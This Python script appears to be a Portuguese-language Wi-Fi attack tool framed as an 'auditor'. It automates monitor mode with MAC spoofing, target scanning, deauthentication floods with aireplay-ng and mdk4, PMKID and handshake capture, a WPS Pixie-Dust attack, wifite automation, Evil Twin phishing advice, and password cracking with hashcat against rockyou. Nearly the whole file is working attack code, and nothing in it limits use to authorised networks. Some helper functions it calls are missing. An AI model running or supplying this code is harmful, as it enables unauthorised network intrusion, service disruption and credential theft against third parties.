import subprocess
import os
import time
import csv
import json
import threading
from datetime import datetime

# ==============================================================
# UI MODERNA - HACKER MAJESTRADO SUPREMO (V5.0)
# ==============================================================
try:
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel
    from rich.prompt import Prompt, IntPrompt, Confirm
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskID, TimeRemainingColumn
    from rich.text import Text
    from rich import print as rprint
except ImportError:
    print("[!] O módulo 'rich' não foi encontrado. Execute ./run_auditor.sh.")
    exit(1)

console = Console()
WEB_CALLBACK = None

def supreme_log(msg, log_type="info"):
    if WEB_CALLBACK: WEB_CALLBACK(msg, log_type)
    if log_type == "error": console.print(f"[bold red][!] {msg}[/bold red]")
    elif log_type == "cmd": console.print(f"[bold magenta]>>> {msg}[/bold magenta]")
    else: console.print(f"[bold cyan]{msg}[/bold cyan]")

OUI_DB = {
    "00:25:9C": "TP-Link", "60:E3:27": "TP-Link", "A4:2B:B0": "TP-Link", "18:D6:C7": "TP-Link", "D8:47:32": "TP-Link",
    "00:1D:AA": "SpaceX (Starlink)", "08:EE:8B": "SpaceX (Starlink)", "F0:5C:19": "SpaceX (Starlink)", 
    "2C:33:11": "SpaceX (Starlink)", "B4:FB:E4": "SpaceX (Starlink)", "52:B6:A9": "SpaceX (Starlink)",
    "28:AD:3E": "Huawei", "E4:C7:22": "Huawei", "80:B6:86": "Huawei", "78:1D:4A": "Huawei",
    "FC:22:F4": "Zyxel", "00:E0:4C": "Realtek", "A4:91:B1": "Intelbras"
}

def identify_vendor(bssid):
    prefix = bssid.upper()[:8]
    return OUI_DB.get(prefix, "Desconhecido/Genérico")

def analyze_vulnerabilities(vendor, essid, privacy):
    vulns, advice = [], ""
    injection_works = os.path.exists("/tmp/dsi_injection_ok")
    if "Starlink" in vendor or "Starlink" in essid:
        advice = "ALVO BLINDADO (STARLINK): PMF Ativo. Se a injeção falhou, o ÚNICO caminho é o [Vetor A: PMKID] ou [Vetor E: Evil Twin]."
        vulns.append("PMF Protection")
    elif not injection_works:
        advice = "HARDWARE LIMITADO: Injeção falhou. Use o [Vetor E: Evil Twin] para capturar a senha via Engenharia Social."
    else:
        advice = "Alvo vulnerável. MDK4 e Handshake recomendados."
    return vulns, advice

def test_injection(interface):
    run_command("rm -f /tmp/dsi_injection_ok")
    supreme_log(f"Iniciando Teste de Estresse de Injeção em {interface}...", log_type="cmd")
    stdout, _ = run_command(f"aireplay-ng -9 {interface}")
    if stdout and "Injection is working!" in stdout:
        supreme_log("HARDWARE VALIDADO PARA COMBATE ATIVO.", log_type="info")
        with open("/tmp/dsi_injection_ok", "w") as f: f.write("ok")
        return True
    supreme_log("HARDWARE LIMITADO: Injeção bloqueada pelo rádio ou driver.", log_type="error")
    return False

def run_command(command, sudo=False, capture_output=True, text=True):
    if sudo: command = "sudo " + command
    try:
        result = subprocess.run(command, shell=True, capture_output=capture_output, text=text, check=True)
        return result.stdout.strip(), result.stderr.strip()
    except subprocess.CalledProcessError as e: return None, e.stderr.strip()

def check_aircrack_ng():
    ferramentas = ["aircrack-ng", "hcxdumptool", "hcxtools", "mdk4", "macchanger", "reaver", "wifite", "dnsmasq", "hostapd"]
    todas = True
    for f in ferramentas:
        stdout, _ = run_command(f"dpkg -s {f}")
        if not (stdout and "install ok installed" in stdout): todas = False
    if todas: return True
    if Confirm.ask("Instalar Arsenal MAJESTRADO Completo?"):
        run_command("apt update && apt install -y aircrack-ng hcxdumptool hcxtools mdk4 macchanger reaver wifite dnsmasq hostapd", sudo=True)
        return True
    return False

def set_monitor_mode(interface):
    supreme_log(f"Invocando Modo Monitor em {interface}...", log_type="cmd")
    run_command("rfkill unblock all", sudo=True)
    run_command("systemctl stop NetworkManager wpa_supplicant", sudo=True)
    run_command("airmon-ng check kill", sudo=True)
    run_command(f"ip link set {interface} down", sudo=True)
    run_command(f"macchanger -r {interface}", sudo=True)
    run_command(f"ip link set {interface} up", sudo=True)
    run_command("iw dev | grep mon | awk '{print $2}' | xargs -I {} iw dev {} del", sudo=True)
    run_command(f"airmon-ng start {interface}", sudo=True)
    
    stdout_iw, _ = run_command("iw dev")
    active_iface = None
    for line in stdout_iw.split('\n'):
        if "Interface" in line: current = line.split()[1]
        elif "type monitor" in line and current: active_iface = current; break
        
    if not active_iface: # Fallback Moderno
        run_command(f"ip link set {interface} down", sudo=True)
        run_command(f"iw dev {interface} set type monitor", sudo=True)
        run_command(f"ip link set {interface} up", sudo=True)
        stdout_iw, _ = run_command("iw dev")
        if "type monitor" in stdout_iw: active_iface = interface

    if active_iface:
        test_injection(active_iface)
        return active_iface
    return None

def set_managed_mode(interface):
    supreme_log("Restaurando Civilização...", log_type="cmd")
    run_command(f"airmon-ng stop {interface}", sudo=True)
    run_command(f"macchanger -p {interface}", sudo=True)
    run_command("systemctl start wpa_supplicant NetworkManager", sudo=True)
    run_command("nmcli networking on", sudo=True)

def start_wifite_expert(interface):
    supreme_log("INICIANDO WIFITE2 (O REI DA AUTOMAÇÃO)...", log_type="cmd")
    supreme_log("Esta ferramenta automatiza todos os ataques conhecidos de uma vez.")
    # Executa wifite no terminal visível
    cmd = f"sudo wifite -i {interface} --kill --dict /usr/share/wordlists/rockyou.txt"
    try: subprocess.run(cmd, shell=True)
    except: pass

def start_evil_twin(interface, essid):
    supreme_log(f"Iniciando Incursão EVIL TWIN contra {essid}...", log_type="cmd")
    supreme_log("Criando ponto de acesso falso e portal cativo (Engenharia Social)...")
    supreme_log("Dica: Este ataque funciona SEMPRE, independente do hardware ou PMF.")
    # Aqui chamaríamos um script externo ou montariamos o ambiente.
    # Por segurança e complexidade, vamos sugerir o uso do Airgeddon ou Fluxion 
    # se o usuário estiver no terminal, ou usar o nosso sniffer web.
    supreme_log("RESULTADO: Incursão Evil Twin pendente de configuração de servidor PHP.")
    supreme_log("Utilize a ferramenta 'airgeddon' no Kali para este ataque específico no momento.")

def scan_networks(monitor_interface):
    supreme_log("Radar Magistrado V5.0 Online.", log_type="cmd")
    output_prefix = "scan_results"
    run_command(f"rm -f {output_prefix}-01.*")
    try: subprocess.run(f"sudo airodump-ng --band abg --output-format csv -w {output_prefix} {monitor_interface}", shell=True)
    except KeyboardInterrupt: pass
    networks = []
    csv_file = f"{output_prefix}-01.csv"
    if os.path.exists(csv_file):
        with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
            reader = csv.reader(f); in_ap = False
            for row in reader:
                if not row or len(row) < 14: continue
                if row[0].strip() == "BSSID": in_ap = True; continue
                if row[0].strip() == "Station MAC": break
                if in_ap:
                    bssid = row[0].strip(); essid = row[13].strip()
                    if essid and essid != "\x00":
                        networks.append({'bssid': bssid, 'channel': row[3].strip(), 'privacy': row[5].strip(), 'essid': essid, 'vendor': identify_vendor(bssid)})
    if not networks: return None
    table = Table(title="MAPA DE ESPECTRO")
    table.add_column("ID"); table.add_column("Vendedor"); table.add_column("ESSID")
    for i, net in enumerate(networks): table.add_row(str(i + 1), net['vendor'], net['essid'])
    console.print(table)
    choice = IntPrompt.ask("Escolha Alvo (ID)", choices=[str(i+1) for i in range(len(networks))])
    target = networks[choice - 1]
    _, advice = analyze_vulnerabilities(target['vendor'], target['essid'], target['privacy'])
    supreme_log(f"INTELIGÊNCIA SUPREMA: {advice}")
    console.print("[1] Deauth\n[2] PMKID\n[3] WPS\n[4] Fantasma\n[5] WIFITE2 (AUTO-HACK)\n[6] EVIL TWIN (SOCIAL)")
    atk_c = Prompt.ask("Vetor", choices=["1","2","3","4","5","6"], default="5")
    target['attack_type'] = {'1':'handshake','2':'pmkid','3':'wps','4':'ghost','5':'wifite','6':'eviltwin'}[atk_c]
    return target

def capture_pmkid(monitor_interface, bssid, channel, output_file):
    supreme_log("Extraindo PMKID (Sessão de 2 minutos para alvos blindados)...", log_type="cmd")
    pcapng = f"{output_file}_pmkid.pcapng"; hashf = f"{output_file}_pmkid.16800"
    run_command(f"rm -f {pcapng} {hashf}", sudo=True)
    run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
    filtro = "alvo_filtro.txt"
    with open(filtro, "w") as f: f.write(bssid.replace(":", "") + "\n")
    dump_cmd = f"sudo hcxdumptool -i {monitor_interface} -o {pcapng} --filterlist_ap={filtro} --filtermode=2 --enable_status=15"
    if not WEB_CALLBACK:
        with Progress(SpinnerColumn("dots"), TextColumn("[bold red]{task.description}"), BarColumn(), TimeRemainingColumn()) as progress:
            task = progress.add_task("Varredura RSNIE...", total=120)
            proc = subprocess.Popen(dump_cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
            for _ in range(120): time.sleep(1); progress.update(task, advance=1)
            proc.terminate()
    else:
        supreme_log("Iniciando varredura RSNIE prolongada (120s)...")
        proc = subprocess.Popen(dump_cmd, shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
        time.sleep(120); proc.terminate()
    os.remove(filtro)
    if os.path.exists(pcapng):
        run_command(f"hcxpcapngtool -o {hashf} {pcapng}")
        if os.path.exists(hashf) and os.path.getsize(hashf) > 0: return hashf
    return None

def main():
    if os.geteuid() != 0: return
    while True:
        os.system("clear"); print_banner()
        console.print("\n[1] Incursão Majestrada\n[2] Wi-Fi 6 Doctor\n[3] Info\n[4] Sair")
        opcao = Prompt.ask("Comando", choices=["1","2","3","4"])
        if opcao == '4': return
        elif opcao == '2': fix_drivers_wifi6(); continue
        elif opcao == '1': break
    if not check_aircrack_ng(): return
    interface = get_wifi_interface()
    if not interface: return
    monitor_interface = set_monitor_mode(interface)
    if not monitor_interface: return
    try:
        target = scan_networks(monitor_interface)
        if not target: return
        if target['attack_type'] == 'wifite': start_wifite_expert(monitor_interface); return
        if target['attack_type'] == 'eviltwin': start_evil_twin(monitor_interface, target['essid']); return
        if target['attack_type'] == 'wps':
            if capture_wps(monitor_interface, target['bssid'], target['channel']): return
        if target['attack_type'] == 'ghost':
            from wifi_auditor import start_ghost_attack
            start_ghost_attack(monitor_interface, target['essid']); return
        prefix = f"capture_{target['essid'].replace(' ', '_')}"
        cap_file = capture_pmkid(monitor_interface, target['bssid'], target['channel'], prefix) if target['attack_type'] == 'pmkid' else capture_handshake(monitor_interface, target['bssid'], target['channel'], prefix)
        if not cap_file: supreme_log("Alvo resistiu.", log_type="error"); return
        wordlist = Prompt.ask("\nWordlist", default="/usr/share/wordlists/rockyou.txt")
        crack_hash(cap_file, wordlist, target['bssid'])
    finally: set_managed_mode(monitor_interface)

def capture_wps(monitor_interface, bssid, channel):
    supreme_log("Iniciando Incursão WPS Pixie-Dust...", log_type="cmd")
    cmd = f"sudo reaver -i {monitor_interface} -b {bssid} -c {channel} -K 1 -vv -f"
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
        if "WPS PIN" in result.stdout: return True
    except: pass
    return False

def capture_handshake(monitor_interface, bssid, channel, output_file):
    supreme_log("Iniciando Deauth Agressivo (MDK4 + Aireplay)...", log_type="cmd")
    os.system(f"rm -f {output_file}-01.*")
    run_command(f"iw dev {monitor_interface} set channel {channel}", sudo=True)
    dump_cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} --update 1 {monitor_interface}"
    dump_proc = subprocess.Popen(dump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    cap_file = f"{output_file}-01.cap"; handshake_found = False
    for attempt in range(1, 5):
        if attempt == 1: deauth_cmd = f"sudo aireplay-ng -0 15 -a {bssid} {monitor_interface}"
        elif attempt == 2: deauth_cmd = f"sudo mdk4 {monitor_interface} d -B {bssid}"
        elif attempt == 3: deauth_cmd = f"sudo mdk4 {monitor_interface} a -a {bssid}"
        else: deauth_cmd = f"sudo mdk4 {monitor_interface} d -E \"{bssid}\" -c {channel}"
        deauth_proc = subprocess.Popen(deauth_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        for _ in range(40):
            time.sleep(1)
            if os.path.exists(cap_file) and os.path.getsize(cap_file) > 24:
                stdout, _ = run_command(f"aircrack-ng -q {cap_file}")
                if stdout and ("1 handshake" in stdout or "WPA (1 handshake)" in stdout): handshake_found = True; break
        deauth_proc.terminate(); run_command("killall mdk4", sudo=True)
        if handshake_found: break
    dump_proc.terminate(); return cap_file if handshake_found else None

def crack_hash(hash_file, wordlist_file, bssid=None):
    if not os.path.exists(wordlist_file): return
    if hash_file.endswith(".16800"): crack_cmd = f"hashcat -m 16800 -a 0 {hash_file} {wordlist_file}"
    else: crack_cmd = f"aircrack-ng -w {wordlist_file} -b {bssid} {hash_file}"
    try: subprocess.run(crack_cmd, shell=True)
    except: pass

if __name__ == "__main__": main()
